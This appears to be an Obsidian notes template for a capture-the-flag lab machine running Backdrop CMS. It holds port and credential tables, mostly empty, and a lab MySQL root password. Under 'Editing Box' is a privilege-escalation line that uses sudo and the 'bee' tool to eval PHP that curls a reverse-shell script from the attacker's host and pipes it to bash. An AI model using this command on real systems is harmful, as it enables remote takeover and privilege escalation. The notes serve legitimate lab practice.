[IP]
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
Web Address
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
Editing Box

```
sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('curl 10.10.16.58:8000/rev.sh|bash;');"
```

wget from local python server

```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget http://${KaliIP}:8000/[file]`;

dv.paragraph("```bash\n" + command + "\n```");
```


## Provided Credentials
---
'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';

| Username | Password            | Notes |
| -------- | ------------------- | ----- |
| root     | BackDropJ2024DS2024 | mysql |

---


## Open Ports
---

| Port | Service | Notes |
| ---- | ------- | ----- |
| 22   | SSH     |       |
| 80   | http    |       |

---

## Discovered Subdomains
---


---

## Discovered Credentials
---

| Username | Password | Notes |
| -------- | -------- | ----- |
|          |          |       |

---

## Attack Angles
---


---

## User Flag

```

```

## Root Flag

```

```